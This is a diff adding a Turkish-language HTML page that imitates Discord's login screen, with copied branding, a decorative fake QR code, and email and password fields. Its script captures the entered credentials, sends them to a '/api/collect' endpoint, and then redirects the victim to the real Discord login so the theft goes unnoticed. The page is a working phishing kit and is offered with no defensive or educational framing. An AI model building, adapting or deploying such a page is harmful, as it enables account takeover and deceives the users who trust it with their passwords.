@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Konuş ve Takıl</title>
+    <link rel="icon" type="image/svg+xml" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
+    <link href="https://fonts.cdnfonts.com/css/whitney-2" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f2f3f5;
+            --bg-tertiary: #e3e5e8;
+            --bg-accent: #5865f2;
+            --text-normal: #2e3338;
+            --text-muted: #747f8d;
+            --text-link: #00aff4;
+            --text-danger: #ed4245;
+            --input-bg: #ffffff;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-normal);
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden;
+            position: relative;
+        }
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiIHBhdHRlcm5UcmFuc2Zvcm09InJvdGF0ZSg0NSkiPjxyZWN0IHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgZmlsbD0icmdiYSgwLDAsMCwwLjAzKSIvPjwvcGF0dGVybj48L2RlZnM+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0idXJsKCNwYXR0ZXJuKSIvPjwvc3ZnPg==');
+            opacity: 0.4;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            width: 100%;
+            animation: fadeIn 0.5s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .login-wrapper {
+            display: flex;
+            flex-direction: row;
+            background-color: var(--bg-secondary);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            max-width: 880px;
+            width: 100%;
+            transition: transform 0.3s ease;
+        }
+        .login-wrapper:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+        .login-box {
+            padding: 32px;
+            width: 480px;
+            text-align: left;
+        }
+        .qr-box {
+            background-color: var(--bg-tertiary);
+            padding: 32px;
+            width: 400px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .qr-box::before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 60%;
+            width: 1px;
+            background-color: rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            width: 130px;
+            margin-bottom: 20px;
+            transition: transform 0.3s ease;
+        }
+        .logo:hover { transform: scale(1.05); }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-normal);
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-muted);
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        label {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+            display: block;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .required { color: var(--text-danger); }
+        input {
+            width: 100%;
+            padding: 10px;
+            background-color: var(--input-bg);
+            border: 1px solid rgba(0, 0, 0, 0.3);
+            border-radius: 3px;
+            color: var(--text-normal);
+            font-size: 16px;
+            transition: all 0.2s ease;
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--bg-accent);
+            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3);
+        }
+        input:hover { border-color: rgba(0, 0, 0, 0.5); }
+        .forgot-password {
+            font-size: 14px;
+            color: var(--text-link);
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+            transition: text-decoration 0.2s ease;
+        }
+        .forgot-password:hover { text-decoration: underline; }
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--bg-accent);
+            border: none;
+            border-radius: 3px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .login-button:hover {
+            background-color: #4752c4;
+            box-shadow: 0 4px 8px rgba(88, 101, 242, 0.3);
+        }
+        .login-button:active { transform: translateY(1px); }
+        .login-button::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+        .login-button:focus:not(:active)::after {
+            animation: ripple 0.6s ease-out;
+        }
+        @keyframes ripple {
+            0% { transform: scale(0, 0); opacity: 0.5; }
+            100% { transform: scale(20, 20); opacity: 0; }
+        }
+        .register {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-top: 16px;
+        }
+        .register a {
+            color: var(--text-link);
+            text-decoration: none;
+            transition: text-decoration 0.2s ease;
+        }
+        .register a:hover { text-decoration: underline; }
+        .qr-box h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-normal);
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+        }
+        .qr-code {
+            width: 160px;
+            height: 160px;
+            background-color: white;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            padding: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
+        }
+        .qr-code:hover { transform: scale(1.03); }
+        .qr-box p {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            max-width: 280px;
+        }
+        .qr-box strong {
+            color: var(--text-normal);
+            font-weight: 600;
+        }
+        .loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+        }
+        .loader-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top-color: var(--bg-accent);
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .error-message {
+            color: var(--text-danger);
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+            animation: shake 0.5s ease;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        @media (max-width: 768px) {
+            .login-wrapper { flex-direction: column; max-width: 100%; }
+            .login-box, .qr-box { width: 100%; padding: 24px; }
+            .qr-box { border-top: 1px solid var(--bg-tertiary); }
+            .qr-box::before { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-wrapper">
+            <div class="login-box">
+                <img src="https://discord.com/assets/2c21eda7c7dc9e4635c3ddf8d0e70826.svg" alt="Discord Logosu" class="logo">
+                <h1>Tekrar Hoş Geldin!</h1>
+                <p class="subtitle">Seni tekrar görmekten çok mutluyuz!</p>
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label for="email">E-POSTA VEYA TELEFON NUMARASI <span class="required">*</span></label>
+                        <input type="text" id="email" placeholder="E-posta veya Telefon Numarası" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password">ŞİFRE <span class="required">*</span></label>
+                        <input type="password" id="password" placeholder="Şifre" required>
+                    </div>
+                    <a href="https://discord.com/password-reset" class="forgot-password">Şifreni mi unuttun?</a>
+                    <button type="submit" class="login-button">Giriş Yap</button>
+                    <p class="register">Hesabın yok mu? <a href="https://discord.com/register">Kayıt Ol</a></p>
+                </form>
+            </div>
+            <div class="qr-box">
+                <h2>QR Kod ile Giriş Yap</h2>
+                <div class="qr-code">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="140" height="140">
+                        <rect width="100" height="100" fill="#fff"/>
+                        <path fill="#000" d="M20 20h10v10H20zM30 20h10v10H30zM40 20h10v10H40zM20 30h10v10H20zM40 30h10v10H40zM20 40h10v10H20zM30 40h10v10H30zM40 40h10v10H40zM60 20h10v10H60zM70 20h10v10H70zM60 30h10v10H60zM60 40h10v10H60zM70 40h10v10H70zM20 60h10v10H20zM30 60h10v10H30zM40 60h10v10H40zM20 70h10v10H20zM40 70h10v10H40zM20 80h10v10H20zM30 80h10v10H30zM40 80h10v10H40zM60 60h10v10H60zM70 60h10v10H70zM80 60h10v10H80zM60 70h10v10H60zM80 70h10v10H80zM60 80h10v10H60zM70 80h10v10H70zM80 80h10v10H80z"/>
+                    </svg>
+                </div>
+                <p><strong>Discord mobil uygulamasıyla</strong> bunu tara ve hemen giriş yap.</p>
+            </div>
+        </div>
+    </div>
+    <div class="loader" id="loader">
+        <div class="loader-spinner"></div>
+        <p>Discord’a bağlanıyor...</p>
+    </div>
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const loader = document.getElementById('loader');
+        
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Konsola yaz (test için)
+            console.log(`E-posta: ${email}, Şifre: ${password}`);
+
+            // Bilgileri API’ye gönder
+            try {
+                const response = await fetch('/api/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password }),
+                });
+                const data = await response.json();
+                console.log('API cevabı:', data);
+            } catch (err) {
+                console.error('API hatası:', err);
+            }
+
+            // Yükleme animasyonu
+            loader.style.display = 'flex';
+            loader.querySelector('p').textContent = 'Bilgiler gönderiliyor...';
+
+            // Yönlendir
+            setTimeout(() => {
+                loader.querySelector('p').textContent = 'Başarılı! Yönlendiriliyor...';
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    window.location.href = 'https://discord.com/login';
+                }, 1500);
+            }, 1000);
+        });
+
+        // Buton dalgalanma efekti
+        const buttons = document.querySelectorAll('.login-button');
+        buttons.forEach(button => {
+            button.addEventListener('click', function(e) {
+                let x = e.clientX - e.target.getBoundingClientRect().left;
+                let y = e.clientY - e.target.getBoundingClientRect().top;
+                let ripple = document.createElement('span');
+                ripple.style.left = `${x}px`;
+                ripple.style.top = `${y}px`;
+                this.appendChild(ripple);
+                setTimeout(() => ripple.remove(), 600);
+            });
+        });
+    </script>
+</body>
+</html>
